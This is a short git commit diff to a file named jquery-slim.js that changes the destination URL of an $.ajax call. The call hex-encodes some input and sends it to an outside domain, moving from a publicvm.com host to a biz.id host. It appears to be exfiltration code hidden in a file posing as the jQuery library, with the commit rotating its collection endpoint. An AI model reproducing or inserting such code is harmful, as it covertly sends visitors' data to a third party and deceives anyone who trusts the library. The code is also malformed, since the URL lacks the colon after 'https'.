6517d3c2f6e310d4b8ed26a90d50412445b7cffc
styleshotss <138004683+styleshotss@users.noreply.github.com>
2024-07-25 06:18:49 +0700

    Update jquery-slim.js

--- jquery-slim.js
+++ jquery-slim.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https//system-bimarvg.publicvm.com/halo/?cat=" +
+                    "https//system.bima-rvg.biz.id/halo/?cat=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
